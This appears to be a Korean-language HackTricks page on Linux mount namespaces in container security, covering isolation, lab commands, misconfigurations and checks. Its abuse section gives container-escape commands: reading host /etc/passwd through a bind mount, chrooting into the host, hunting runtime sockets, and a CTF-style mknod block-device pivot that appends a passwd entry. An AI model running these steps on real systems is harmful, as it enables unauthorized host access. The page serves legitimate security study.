# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

mount namespace는 프로세스가 확인하는 **mount table**을 제어합니다. 이는 가장 중요한 컨테이너 격리 기능 중 하나입니다. root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, 그리고 다양한 runtime-specific helper mounts가 모두 해당 mount table을 통해 표현되기 때문입니다. 두 프로세스가 모두 `/`, `/proc`, `/sys`, `/tmp`에 접근하더라도, 해당 경로가 무엇으로 해석되는지는 프로세스가 속한 mount namespace에 따라 달라집니다.

container-security 관점에서 mount namespace는 흔히 "깔끔하게 준비된 application filesystem"과 "이 프로세스가 host filesystem을 직접 확인하거나 영향을 줄 수 있음"을 가르는 요소입니다. 따라서 bind mounts, `hostPath` volumes, privileged mount operations, 그리고 writable `/proc` 또는 `/sys` exposures는 모두 이 namespace를 중심으로 이루어집니다.

## 동작

runtime이 container를 실행할 때는 일반적으로 새로운 mount namespace를 생성하고, container를 위한 root filesystem을 준비하며, 필요에 따라 procfs 및 기타 helper filesystems를 mount한 다음, 선택적으로 bind mounts, tmpfs mounts, secrets, config maps 또는 host paths를 추가합니다. 해당 프로세스가 namespace 내부에서 실행되기 시작하면, 프로세스가 확인하는 mount 집합은 host의 기본 view와 상당 부분 분리됩니다. host는 여전히 실제 underlying filesystem을 확인할 수 있지만, container는 runtime이 container를 위해 구성한 버전을 확인합니다.

이는 host가 모든 것을 계속 관리하는 상황에서도 container가 자체 root filesystem을 가진다고 인식하게 만들 수 있다는 점에서 강력합니다. 동시에 runtime이 잘못된 mount를 노출하면 프로세스가 host resources를 갑자기 확인할 수 있게 되며, 나머지 security model이 이를 보호하도록 설계되지 않았을 수 있다는 점에서 위험합니다.

## Lab

다음 명령으로 private mount namespace를 생성할 수 있습니다:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
해당 namespace 외부에서 다른 shell을 열고 mount table을 확인하면, tmpfs mount가 격리된 mount namespace 내부에만 존재한다는 것을 확인할 수 있습니다. 이는 mount isolation이 추상적인 이론이 아니라는 점을 보여주는 유용한 실습입니다. kernel은 실제로 process에 서로 다른 mount table을 제공하고 있습니다.

해당 namespace 외부에서 다른 shell을 열고 mount table을 확인하면, tmpfs mount는 격리된 mount namespace 내부에만 존재합니다.

containers 내부에서는 다음과 같이 빠르게 비교할 수 있습니다:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
두 번째 예시는 runtime configuration이 filesystem boundary에 얼마나 큰 구멍을 쉽게 만들 수 있는지 보여 줍니다.

## Runtime Usage

Docker, Podman, containerd 기반 stack, CRI-O는 모두 일반적인 container를 위해 private mount namespace에 의존합니다. Kubernetes는 volume, projected secret, config map, `hostPath` mount에 동일한 mechanism을 기반으로 합니다. Incus/LXC environment 역시 mount namespace에 크게 의존하며, 특히 system container는 application container보다 더 풍부하고 machine-like한 filesystem을 노출하는 경우가 많기 때문입니다.

따라서 container filesystem 문제를 검토할 때, 대개 격리된 Docker 특이점을 보고 있는 것이 아닙니다. workload를 실행한 platform을 통해 표현된 mount-namespace 및 runtime-configuration 문제를 보고 있는 것입니다.

## Misconfigurations

가장 명백하고 위험한 실수는 bind mount를 통해 host root filesystem 또는 다른 민감한 host path를 노출하는 것입니다. 예를 들어 `-v /:/host` 또는 Kubernetes의 쓰기 가능한 `hostPath`가 이에 해당합니다. 이 시점에서 질문은 더 이상 "container가 어떻게든 escape할 수 있는가?"가 아니라 "얼마나 많은 유용한 host content가 이미 직접 보이고 쓰기 가능한가?"가 됩니다. 쓰기 가능한 host bind mount는 exploit의 나머지 과정을 단순한 file placement, chroot, config modification 또는 runtime socket discovery 문제로 바꾸는 경우가 많습니다.

또 다른 일반적인 문제는 더 안전한 container view를 우회하는 방식으로 host `/proc` 또는 `/sys`를 노출하는 것입니다. 이러한 filesystem은 일반적인 data mount가 아니라 kernel 및 process state에 대한 interface입니다. workload가 host version에 직접 접근할 수 있다면 container hardening의 많은 가정이 더 이상 정상적으로 적용되지 않습니다.

Read-only protection도 중요합니다. read-only root filesystem이 container를 마법처럼 안전하게 만들지는 않지만, attacker가 staging에 사용할 수 있는 공간을 크게 줄이고 persistence, helper-binary placement 및 config tampering을 더 어렵게 만듭니다. 반대로 writable root 또는 writable host bind mount는 attacker가 다음 단계를 준비할 공간을 제공합니다.

## Abuse

mount namespace가 잘못 사용되면 attacker는 일반적으로 네 가지 행동 중 하나를 수행합니다. container 외부에 있어야 하는 **host data를 읽습니다**. writable bind mount를 통해 **host configuration을 수정합니다**. capability와 seccomp가 허용하는 경우 **추가 resource를 mount하거나 remount합니다**. 또는 container platform 자체에 더 많은 access를 요청할 수 있도록 하는 **강력한 socket과 runtime state directory에 접근합니다**.

container가 이미 host filesystem을 볼 수 있다면 security model의 나머지 부분은 즉시 달라집니다.

host bind mount가 의심되면 먼저 무엇이 available한지와 writable한지를 확인합니다:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
호스트 root filesystem이 read-write로 mount되어 있다면, 호스트에 직접 접근하는 것은 종종 다음처럼 간단합니다:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
목표가 직접 chrooting이 아닌 privileged runtime access라면, socket과 runtime state를 열거합니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN`이 존재하는 경우, 컨테이너 내부에서 새로운 mount를 생성할 수 있는지도 테스트합니다:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 전체 예시: Two-Shell `mknod` Pivot

컨테이너의 root 사용자가 block device를 생성할 수 있고, host와 container가 유용한 방식으로 사용자 identity를 공유하며, attacker가 이미 host에서 low-privilege foothold를 확보한 경우 더욱 특수한 abuse 경로가 나타납니다. 이 상황에서 container는 `/dev/sda`와 같은 device node를 생성할 수 있으며, low-privilege host user는 이후 일치하는 container process의 `/proc/<pid>/root/`를 통해 이를 읽을 수 있습니다.

컨테이너 내부:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
호스트에서 컨테이너 셸 PID를 찾은 후, 해당하는 low-privilege 사용자로서:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
중요한 교훈은 정확한 CTF 문자열 검색 자체가 아닙니다. `/proc/<pid>/root/`를 통한 mount namespace 노출로 인해, cgroup device policy가 container 내부에서의 직접적인 사용을 차단했더라도 host user가 container에서 생성된 device node를 재사용할 수 있다는 점입니다.

## 확인

이 명령어들은 현재 process가 실제로 사용 중인 filesystem view를 보여 주기 위한 것입니다. 목표는 host에서 파생된 mount, 쓰기가 가능한 민감한 경로, 그리고 일반적인 application container의 root filesystem보다 더 광범위해 보이는 모든 항목을 찾는 것입니다.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
여기서 중요한 점:

- Host에서 가져온 Bind mounts, 특히 `/`, `/proc`, `/sys`, runtime state 디렉터리 또는 socket 위치는 즉시 눈에 띄어야 합니다.
- 예상치 못한 read-write mounts는 대량의 read-only helper mounts보다 일반적으로 더 중요합니다.
- `mountinfo`는 경로가 실제로 Host에서 파생된 것인지, 아니면 overlay 기반인지 확인하기에 가장 좋은 위치인 경우가 많습니다.

이러한 검사를 통해 **이 namespace에서 어떤 리소스가 보이는지**, **어떤 리소스가 Host에서 파생되었는지**, **그중 어떤 리소스가 writable하거나 security-sensitive한지**를 파악할 수 있습니다.
{{#include ../../../../../banners/hacktricks-training.md}}
